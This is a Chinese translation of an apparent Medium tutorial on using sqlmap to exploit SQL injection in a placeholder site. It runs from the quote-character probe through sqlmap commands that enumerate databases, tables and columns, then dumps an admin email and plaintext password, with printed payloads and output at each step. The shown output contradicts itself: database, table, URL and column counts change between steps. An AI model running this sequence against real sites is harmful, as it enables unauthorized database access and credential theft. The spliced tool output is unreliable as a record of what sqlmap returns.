# 黑客如何利用 sqlmap 实施 SQL 注入攻击

> 原文：<https://medium.com/nerd-for-tech/how-hackers-perform-sql-injection-attack-using-sqlmap-dfb08519dc99?source=collection_archive---------2----------------------->

![](img/39f114028d01b669e66d2f71104a80be.png)

SQL(结构化查询语言)是一种用于管理存储在数据库中的数据的编程语言。这通常会被攻击者滥用，如果网站没有对用户输入进行净化，这种情况也会被利用。这些数据可能包括任意数量的项目，包括敏感的公司数据、用户列表或私人客户详细信息。

攻击者可以对易受攻击的网站执行恶意的 SQL 查询，并可以检索、编辑或删除这些表。这些查询可以由名为 sqlmap 的工具自动生成和执行。

sqlmap 是一个开源的渗透测试工具，它自动执行检测和利用 SQL 注入漏洞以及接管数据库服务器的过程。Sqlmap 甚至可以在一组特定的条件下写入特定的数据库。Sqlmap 带有强大的检测引擎和各种开关，有助于执行有效的攻击。

在这篇文章中，我们将攻击一个测试网站，我会引导你通过它。

假设我们要攻击这个易受攻击的站点，您可以使用下面的命令获得 sqlmap 中存在的开关的信息。

```
root@kali:~# sqlmap --help
```

所以我会黑一个测试网站，并演示给你看。

# 识别漏洞

首先，我们需要检查网站是否容易受到 SQL 攻击。

```
http://www.site.com/test.php?id=1
```

这是我们的测试网站，你可以看到网站公开了它不应该公开的参数 id。因此，我们可以通过在 ID 后面加上单引号来识别漏洞。

```
http://www.site.com/test.php?id=1'
```

如果网站对错误做出响应或做出任何不当行为，我们可以确认该网站容易受到 SQL 攻击。我们的网站出现了错误，因此容易受到 SQL 攻击。

# 攻击网站

既然我们知道网站易受攻击，我们可以继续攻击网站。

## 扫描网站

我们可以通过使用以下命令扫描网站来进行双重检查。

```
**$ python sqlmap.py -u "http://www.site.com/test.php?id=1"**
```

SQLmap 将使用其强大的搜索引擎扫描整个网站，它扫描目标系统上运行的操作系统版本，并返回以下信息。

```
**[*] starting at 12:10:33
[12:10:33] [INFO] resuming back-end DBMS 'mysql'
[12:10:34] [INFO] testing connection to the target url
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
---
Place: GET
Parameter: id
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
    Payload: id=51 AND (SELECT 1489 FROM(SELECT COUNT(*),CONCAT(0x3a73776c3a,(SELECT (CASE WHEN (1489=1489) THEN 1 ELSE 0 END)),0x3a7a76653a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
---
[12:10:37] [INFO] the back-end DBMS is MySQL
web server operating system: FreeBSD
web application technology: Apache 2.2.22
back-end DBMS: MySQL 5**
```

我们知道该网站易受攻击，所以让我们搜索一个可用的数据库。

```
**$ python sqlmap.py -u "http://www.sitemap.com/test.php?id=1" --dbs**
```

该命令将扫描整个目标系统，并列出可用的数据库。

```
**[*] starting at 12:12:56
[12:12:56] [INFO] resuming back-end DBMS 'mysql'
[12:12:57] [INFO] testing connection to the target url
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
---
Place: GET
Parameter: id
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
    Payload: id=51 AND (SELECT 1489 FROM(SELECT COUNT(*),CONCAT(0x3a73776c3a,(SELECT (CASE WHEN (1489=1489) THEN 1 ELSE 0 END)),0x3a7a76653a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
---
[12:13:00] [INFO] the back-end DBMS is MySQL
web server operating system: FreeBSD
web application technology: Apache 2.2.22
back-end DBMS: MySQL 5
[12:13:00] [INFO] fetching database names
[12:13:00] [INFO] the SQL query used returns 2 entries
[12:13:00] [INFO] resumed: information_schema
[12:13:00] [INFO] resumed: safecosmetics
available databases [2]:
[*] information_schema
[*] sedulousrams**
```

在这里，您可以看到它列出了可用的数据库 **sedulousrams** 似乎很有趣，所以让我们使用以下命令来查看该数据库中可用的表。

## 在数据库中查找表

让我们用下面的命令在 **sedulousrams** 数据库中搜索表。

```
**$ python sqlmap.py -u "http://www.site.com/test.php?id=1" --tables -D sedulousrams**
```

网站返回了以下输出

```
**[11:55:18] [INFO] the back-end DBMS is MySQL
web server operating system: FreeBSD
web application technology: Apache 2.2.22
back-end DBMS: MySQL 5
[11:55:18] [INFO] fetching tables for database: 'safecosmetics'
[11:55:19] [INFO] heuristics detected web page charset 'ascii'
[11:55:19] [INFO] the SQL query used returns 216 entries
[11:55:20] [INFO] retrieved: acl_acl
[11:55:21] [INFO] retrieved: acl_acl_sections
[11:55:21] [INFO] retrieved: userinfo
........... more tables**
```

在这些返回的表中， **userinfo** 表似乎是一个有趣的表。因此，我们将使用下面的命令来看看它有哪些列。

## 在表中搜索列

我们将使用下面的命令来查看 **userinfo** 表中的列。

```
**$ python sqlmap.py -u "http://www.site.com/section.php?id=1" --columns -D sedulousrams -T userinfo**
```

输出

```
**[12:17:39] [INFO] the back-end DBMS is MySQL
web server operating system: FreeBSD
web application technology: Apache 2.2.22
back-end DBMS: MySQL 5
[12:17:39] [INFO] fetching columns for table 'users' in database 'sedulousrams'
[12:17:41] [INFO] heuristics detected web page charset 'ascii'
[12:17:41] [INFO] the SQL query used returns 8 entries
[12:17:42] [INFO] retrieved: id
[12:17:43] [INFO] retrieved: int(11)
[12:17:45] [INFO] retrieved: name
[12:17:46] [INFO] retrieved: text
[12:17:47] [INFO] retrieved: password
[12:17:48] [INFO] retrieved: text
.......
[12:17:59] [INFO] retrieved: hash
[12:18:01] [INFO] retrieved: varchar(128)
Database: sedulousrams
Table: users
[8 columns]
+-------------------+--------------+
| Column            | Type         |
+-------------------+--------------+
| email             | text         |
| id                | int(11)      |
| name              | text         |
| password          | text         |
+-------------------+--------------+**
```

它返回了一些有趣的信息，但是你知道下面的命令会返回比这个更多的信息，即用户 id 和密码。

## 扔掉桌子

下一个明显的步骤是转储表格，这将允许我们看到实际的电子邮件和密码！

命令

```
$ python sqlmap.py -u "http://www.site.com/section.php?id=51" --dump -D sedulousrams -T userinfo
```

这就是我们期待的精彩输出。

```
**+----+-----------+---------------+----------+
| id | name      |     email     | password | 
+----+-----------+---------------+----------+
| 1  | admin     |admin@site.com | imsmart  |        
+----+-----------+---------------+----------+**
```

在这里，你有它，电子邮件 id 和密码，因为你可以看到这是多么可怕的容易黑客攻击 SQL 易受攻击的网站，所以在它被黑客攻击之前保护你的网站！

感谢阅读